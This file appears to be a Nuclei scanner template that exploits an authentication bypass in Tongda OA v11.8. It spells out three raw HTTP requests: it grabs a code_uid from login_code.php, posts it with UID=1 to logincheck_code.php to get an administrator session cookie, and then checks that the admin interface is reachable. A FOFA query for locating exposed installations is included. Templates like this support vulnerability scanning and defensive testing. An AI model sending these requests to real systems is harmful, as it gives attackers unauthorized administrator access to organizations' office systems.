http:
- extractors:
  - group: 1
    internal: true
    name: uid
    regex:
    - '"code_uid":"(.*?)"'
    type: regex
  - group: 1
    internal: true
    name: cookie
    part: header
    regex:
    - PHPSESSID=(.*?);
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code_1 == 200 && contains(body_1, "\"code_uid\":\"{") && contains(body_1,"\"status\":1")
    - status_code_2 == 200 && contains(body_2,"index.php?isIE")
    - status_code_2 == 200 && contains(header_2,"Set-Cookie")
    - "status_code_3 == 200 && !contains(body_3,\"<title>\u7528\u6237\u672A\u767B\u5F55\
      </title>\")  && contains(body_3,\"loginUser\")"
    type: dsl
  raw:
  - 'GET /general/login_code.php HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /logincheck_code.php HTTP/1.1

    Host: {{Hostname}}


    CODEUID={{uid}}&UID=1

    '
  - 'GET /general/index.php?isIE=0&modify_pwd=0 HTTP/1.1

    Host: {{Hostname}}

    Cookie: PHPSESSID={{cookie}};

    '
id: tongda-login-code-authbypass
info:
  author: SleepingBag945
  description: 'There is a login bypass vulnerability in Tongda OA v11.8 logincheck_code.php,
    through which an attacker can log in to the system administrator background

    '
  metadata:
    fofa-query: "app=\"TDXK-\u901A\u8FBEOA\""
    max-request: 3
    verified: true
  name: Tongda OA v11.8 logincheck_code.php - Authentication Bypass
